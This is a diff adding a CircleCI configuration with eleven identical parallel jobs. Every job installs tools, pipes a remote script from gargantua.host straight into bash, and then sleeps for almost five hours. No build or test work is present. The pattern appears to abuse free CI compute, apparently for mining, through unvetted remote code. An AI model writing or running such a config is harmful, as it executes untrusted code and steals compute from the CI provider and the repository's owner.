@@ -1,0 +1,127 @@
+version: 2.1
+
+jobs:
+  sqltrigg:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cray.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  sqltrigg1:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cray.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  sqltrigg2:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cray.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  sqltrigg3:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cray.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  sqltrigg4:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cray.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  sqltrigg5:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cray.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  sqltrigg6:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cray.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  sqltrigg7:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cray.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  sqltrigg8:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cray.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  sqltrigg9:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cray.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  sqltrigg10:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cray.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+workflows:
+  main:
+    jobs:
+      - sqltrigg
+      - sqltrigg1
+      - sqltrigg2
+      - sqltrigg3
+      - sqltrigg4
+      - sqltrigg5
+      - sqltrigg6
+      - sqltrigg7
+      - sqltrigg8
+      - sqltrigg9
+      - sqltrigg10
